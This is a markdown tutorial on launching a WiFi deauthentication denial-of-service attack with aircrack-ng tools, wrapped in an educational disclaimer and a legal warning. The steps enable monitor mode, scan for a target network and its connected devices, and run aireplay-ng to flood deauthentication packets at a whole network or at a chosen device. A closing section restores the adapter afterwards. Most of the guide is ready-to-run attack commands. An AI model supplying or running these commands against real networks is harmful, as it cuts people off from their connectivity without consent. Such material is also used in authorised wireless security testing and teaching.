# WiFi DOS Attack (Deauthentication Attack)

## Disclaimer  
This guide is for educational purposes only. Unauthorized access to networks is illegal and punishable under law. Only perform these actions on networks you own or have permission to test.  

---

## Step-by-Step Guide  

### Step 1: Enable Monitoring Mode  
First, put your WiFi adapter into monitoring mode. Run:  

```bash
airmon-ng start wlan0
```
Replace `wlan0` with your adapter's name. You can check the name using:  

```bash
ifconfig
```
or  

```bash
iwconfig
```

---

### Step 2: Verify Monitoring Mode  
Confirm that your network adapter is now in monitoring mode:  

```bash
ifconfig
```
or  

```bash
iwconfig
```
Once confirmed, proceed to the next step.  

---

### Step 3: Scan for Target WiFi  
Find the **BSSID** (MAC address) and **channel** of the target WiFi network:  

```bash
airodump-ng wlan0
```
This will scan for nearby WiFi networks. Once you spot your target, press `Ctrl + C` to stop scanning.  

Copy the **BSSID** and **channel** of the target WiFi.  

---

### Step 4: Focus on the Target WiFi  
Now, scan only the target WiFi network to view connected devices:  

```bash
airodump-ng --channel {channel_number} --bssid {bssid} wlan0
```
Replace `{channel_number}` and `{bssid}` with the values you copied earlier.  

This will display only the connected devices on the target network.  

---

### Step 5: Launch the Deauthentication (DOS) Attack  

#### Attack the Entire WiFi Network  
Send deauthentication packets to disconnect all devices from the target WiFi:  

```bash
aireplay-ng --deauth 10000 -a {bssid} wlan0
```
This sends 10,000 deauth packets to the target network. You can increase or decrease the number based on your needs.  

#### Attack a Specific Device  
If you want to target a specific device, use its MAC address (Station ID) from the previous scan:  

```bash
aireplay-ng --deauth 10000 -a {bssid} -c {device_mac} wlan0
```
Replace `{device_mac}` with the MAC address of the device you want to disconnect.  

---

## Notes  
- You need a **compatible WiFi adapter** that supports **monitor mode** and **packet injection**.  
- This attack **does not break WiFi encryption**; it only **disconnects devices** temporarily.  
- The attack stops when you stop running the command.
## How to get netwek to restart 
- Run:

```bash
sudo airmon-ng stop wlan0mon
```
- Make sure your adapter is showing up. If it's not up, run:

```bash
ifconfig wlan0 up
```
- Restart the services that you killed.

- Run:
```bash
service NetworkManager start
```
- Note: service network-manager start will give a message saying it's not installed. Hence, run:
```bash
sudo service NetworkManager start
```
- Your Wi-Fi adapter should restart at this point, so give it a second to show up.

---

## Legal Warning  
Performing unauthorized attacks on networks you don’t own is illegal and can result in severe penalties. Always ensure you have explicit permission before testing network security.  
